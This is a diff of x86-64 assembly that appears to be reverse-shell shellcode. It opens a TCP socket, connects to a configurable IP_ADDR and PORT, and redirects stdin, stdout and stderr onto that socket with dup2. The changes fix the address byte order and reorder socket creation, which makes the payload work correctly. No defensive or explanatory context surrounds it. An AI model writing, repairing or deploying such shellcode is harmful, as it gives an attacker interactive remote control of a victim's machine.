@@ -17,42 +17,43 @@ _start:
     mov rbp, rsp
     sub rsp, 16
 
+    mov rdi, AF_INET
+    mov rsi, SOCK_STREAM
+    xor rdx, rdx
+    mov rax, SOCKET
+    syscall
+    mov dword [s], eax
+
+    mov word  [rsp],   AF_INET
+
     mov bx, PORT
     xchg bh, bl ; PORT in bx
+    mov word [rsp+2], bx
 
     lea rdi, [IP_ADDR]
     call ip_to_int ; IP in eax
-
-    mov word  [rsp],   AF_INET
-    mov word  [rsp+2], bx
+    bswap eax
     mov dword [rsp+4], eax
-    mov dword [rsp+8], 0 ; padding
 
-    mov rdi, AF_INET
-    mov rsi, SOCK_STREAM
-    mov rdx, 0
-    mov rax, SOCKET
-    syscall
+    mov qword [rsp+8], 0 ; padding
 
-    mov dword [s], eax
-
-    mov rdi, [s]
+    mov edi, [s]
     lea rsi, [rsp]
     mov rdx, 16
     mov rax, CONNECT
     syscall
 
-    mov rdi, [s]
+    mov edi, [s]
     mov rsi, 0
     mov rax, DUP2
     syscall
 
-    mov rdi, [s]
+    mov edi, [s]
     mov rsi, 1
     mov rax, DUP2
     syscall
 
-    mov rdi, [s]
+    mov edi, [s]
     mov rsi, 2
     mov rax, DUP2
     syscall
